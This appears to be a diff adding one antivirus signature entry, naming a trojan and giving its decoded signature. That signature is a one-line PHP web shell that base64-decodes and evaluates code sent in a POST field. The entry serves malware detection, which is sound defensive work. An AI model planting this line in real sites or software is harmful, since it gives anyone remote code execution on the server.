@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Trojan-916
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+<?php eval(base64_decode($_POST['e']));?>
